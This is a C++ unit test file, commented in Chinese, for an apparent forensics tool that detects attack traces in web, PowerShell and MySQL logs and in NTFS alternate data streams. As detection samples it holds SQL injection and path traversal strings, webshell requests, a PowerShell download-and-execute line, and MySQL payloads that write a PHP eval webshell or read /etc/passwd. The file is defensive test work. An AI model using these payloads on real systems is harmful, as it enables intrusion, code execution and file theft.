// v0.6 单测：日志攻击特征 / PS 历史 / ADS 良性流 / MySQL 日志关键字 / 宝塔文件名
// 每条规则至少 1 正例 + 2 负例 + 若干变体（含 URL 编码）
#include "test_macros.hpp"
#include "core/log_attack.hpp"

using namespace ctfir;

static bool has_kind(const std::vector<LogAttackMatch>& h, LogAttackKind k) {
    for (const auto& x : h) if (x.kind == k) return true;
    return false;
}

// ---- LNX.WEB.LOGATTACK / WIN.WEB.LOGATTACK ----
CTFIR_TEST(logattack_sqli_plain_positive) {
    auto h = match_log_attack("GET", "/index.php?id=1 UNION SELECT 1,2,3", "-");
    CHECK(has_kind(h, LogAttackKind::Sqli));
}

CTFIR_TEST(logattack_sqli_url_encoded_variant) {
    auto h = match_log_attack("GET", "/index.php?id=1%20UNION%20SELECT%201,2", "Mozilla");
    CHECK(has_kind(h, LogAttackKind::Sqli));
}

CTFIR_TEST(logattack_sqli_double_encoded_variant) {
    // %2520 = 双重编码的空格 → UNION SELECT
    auto h = match_log_attack("GET", "/x.php?id=1%2520union%2520select%25201", "-");
    CHECK(has_kind(h, LogAttackKind::Sqli));
}

CTFIR_TEST(logattack_sqli_time_blind_variant) {
    auto h = match_log_attack("GET", "/x.php?id=1%20AND%20SLEEP(5)", "-");
    CHECK(has_kind(h, LogAttackKind::Sqli));
}

CTFIR_TEST(logattack_sqli_negative_normal_query) {
    auto h = match_log_attack("GET", "/index.php?id=12&page=2&sort=asc", "Mozilla/5.0");
    CHECK(!has_kind(h, LogAttackKind::Sqli));
    CHECK(h.empty());
}

CTFIR_TEST(logattack_sqli_negative_union_word_only) {
    // 仅出现 union 作为业务词、无 SELECT —— 不应报
    auto h = match_log_attack("GET", "/news.php?tag=trade-union-news", "Mozilla/5.0");
    CHECK(!has_kind(h, LogAttackKind::Sqli));
}

CTFIR_TEST(logattack_traversal_positive) {
    auto h = match_log_attack("GET", "/static/../../etc/passwd", "-");
    CHECK(has_kind(h, LogAttackKind::Traversal));
}

CTFIR_TEST(logattack_traversal_encoded_variant) {
    auto h = match_log_attack("GET", "/static/..%2f..%2fetc%2fpasswd", "-");
    CHECK(has_kind(h, LogAttackKind::Traversal));
}

CTFIR_TEST(logattack_traversal_negative_dotfile) {
    auto h = match_log_attack("GET", "/assets/jquery.min.js", "Mozilla/5.0");
    CHECK(!has_kind(h, LogAttackKind::Traversal));
}

CTFIR_TEST(logattack_webshell_positive) {
    auto h = match_log_attack("GET", "/upload/shell.php?cmd=id", "-");
    CHECK(has_kind(h, LogAttackKind::Webshell));
}

CTFIR_TEST(logattack_webshell_aspx_variant) {
    auto h = match_log_attack("POST", "/cmd.aspx", "-");
    CHECK(has_kind(h, LogAttackKind::Webshell));
}

CTFIR_TEST(logattack_webshell_negative_normal_php) {
    auto h = match_log_attack("GET", "/index.php", "Mozilla/5.0");
    CHECK(!has_kind(h, LogAttackKind::Webshell));
}

CTFIR_TEST(logattack_scanner_ua_sqlmap_positive) {
    auto h = match_log_attack("GET", "/index.php?id=1", "sqlmap/1.7 (https://sqlmap.org)");
    CHECK(has_kind(h, LogAttackKind::ScannerUa));
}

CTFIR_TEST(logattack_scanner_ua_nikto_variant) {
    auto h = match_log_attack("GET", "/", "Mozilla/5.00 (Nikto/2.1.6)");
    CHECK(has_kind(h, LogAttackKind::ScannerUa));
}

CTFIR_TEST(logattack_scanner_ua_negative_browser) {
    auto h = match_log_attack("GET", "/", "Mozilla/5.0 (Windows NT 10.0) Chrome/120.0");
    CHECK(!has_kind(h, LogAttackKind::ScannerUa));
}

CTFIR_TEST(logattack_scanner_ua_negative_curl_not_flagged) {
    // curl/python-requests 可能是运维脚本，不单独定性
    auto h = match_log_attack("GET", "/health", "curl/8.4.0");
    CHECK(!has_kind(h, LogAttackKind::ScannerUa));
    auto h2 = match_log_attack("GET", "/health", "python-requests/2.31.0");
    CHECK(!has_kind(h2, LogAttackKind::ScannerUa));
}

CTFIR_TEST(combined_log_parse_and_summary) {
    const char* line =
        "10.88.88.88 - - [12/Nov/2026:10:00:00 +0800] "
        "\"GET /index.php?id=1%20UNION%20SELECT%201 HTTP/1.1\" 200 123 "
        "\"-\" \"sqlmap/1.7\"";
    CombinedLogLine r = parse_combined_log_line(line);
    CHECK(r.ok);
    CHECK_EQ(r.ip, std::string("10.88.88.88"));
    CHECK_EQ(r.method, std::string("GET"));
    CHECK(r.uri.find("UNION") != std::string::npos || r.uri.find("union") != std::string::npos
          || r.uri.find("%20UNION") != std::string::npos);
    AccessLogSummary s;
    consume_combined_line(s, line);
    CHECK(s.attack_hits == 1);
    CHECK(s.posts == 0);
    consume_combined_line(s,
        "10.88.88.88 - - [12/Nov/2026:10:01:00 +0800] \"POST /shell.php HTTP/1.1\" 200 - \"-\" \"-\"");
    CHECK(s.posts == 1);
    CHECK(s.attack_hits == 2); // shell.php 也是 webshell 访问
}

CTFIR_TEST(combined_log_negative_empty_and_comment) {
    AccessLogSummary s;
    consume_combined_line(s, "");
    consume_combined_line(s, "# Software: nginx");
    consume_combined_line(s, "not a log line");
    CHECK(s.posts == 0);
    CHECK(s.attack_hits == 0);
}

// ---- WIN.TRACE.PSHIST ----
CTFIR_TEST(pshist_positive_encodedcommand) {
    CHECK(ps_hist_suspicious("powershell -EncodedCommand SQBFAFgA"));
}

CTFIR_TEST(pshist_positive_iex_paren_variant) {
    CHECK(ps_hist_suspicious("IEX(New-Object Net.WebClient).DownloadString('http://x')"));
}

CTFIR_TEST(pshist_positive_whoami_priv_variant) {
    CHECK(ps_hist_suspicious("whoami /priv"));
}

CTFIR_TEST(pshist_negative_normal) {
    CHECK(!ps_hist_suspicious("Get-ChildItem C:\\Users"));
    CHECK(!ps_hist_suspicious("cd C:\\Windows\\System32"));
}

CTFIR_TEST(pshist_negative_whoami_alone) {
    CHECK(!ps_hist_suspicious("whoami"));
}

// ---- WIN.FILES.ADS ----
CTFIR_TEST(ads_hidden_exe_positive) {
    CHECK(!ads_stream_benign(":hidden.exe:$DATA"));
    CHECK(!ads_stream_benign(":payload.dll:$DATA"));
}

CTFIR_TEST(ads_zone_identifier_negative) {
    CHECK(ads_stream_benign(":Zone.Identifier:$DATA"));
    CHECK(ads_stream_benign(":zone.identifier:$DATA"));
}

CTFIR_TEST(ads_main_stream_and_favicon_negative) {
    CHECK(ads_stream_benign("::$DATA"));
    CHECK(ads_stream_benign(":favicon:$DATA"));
    CHECK(ads_stream_benign(""));
}

// ---- MID.MYSQL slow/binlog/general ----
CTFIR_TEST(mysql_log_outfile_positive) {
    std::string why;
    CHECK(mysql_log_suspicious(
        "SELECT '<?php eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/x.php'", &why));
    CHECK(why.find("OUTFILE") != std::string::npos);
}

CTFIR_TEST(mysql_log_udf_and_loadfile_variant) {
    CHECK(mysql_log_suspicious("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so'"));
    CHECK(mysql_log_suspicious("SELECT sys_exec('id')"));
    CHECK(mysql_log_suspicious("SELECT LOAD_FILE('/etc/passwd')"));
}

CTFIR_TEST(mysql_log_negative_normal_select) {
    CHECK(!mysql_log_suspicious("SELECT * FROM users WHERE id=1"));
    CHECK(!mysql_log_suspicious("# Time: 2026-11-12T10:00:00 Query_time: 0.01"));
}

// ---- 宝塔 / 访问日志文件名 ----
CTFIR_TEST(baota_access_log_name_positive) {
    CHECK(is_web_access_log_name("/www/wwwlogs/example.com.log"));
    CHECK(is_web_access_log_name("/www/wwwlogs/access.log"));
    CHECK(is_web_access_log_name("/www/wwwlogs/example.com-access_log"));
    CHECK(is_web_access_log_name("C:\\\\inetpub\\\\logs\\\\u_ex261112.log"));
}

CTFIR_TEST(baota_error_log_name_negative) {
    CHECK(!is_web_access_log_name("/www/wwwlogs/example.com.error.log"));
    CHECK(!is_web_access_log_name("/www/wwwlogs/error.log"));
    CHECK(!is_web_access_log_name("/www/wwwlogs/access.log.gz"));
}

CTFIR_TEST(url_decode_vectors) {
    CHECK_EQ(url_decode("a%20b"), std::string("a b"));
    CHECK_EQ(url_decode("..%2fetc"), std::string("../etc"));
    CHECK_EQ(url_decode_twice("%252e%252e%252f"), std::string("../"));
    CHECK_EQ(url_decode("100%done"), std::string("100%done")); // 非法百分号保留
}
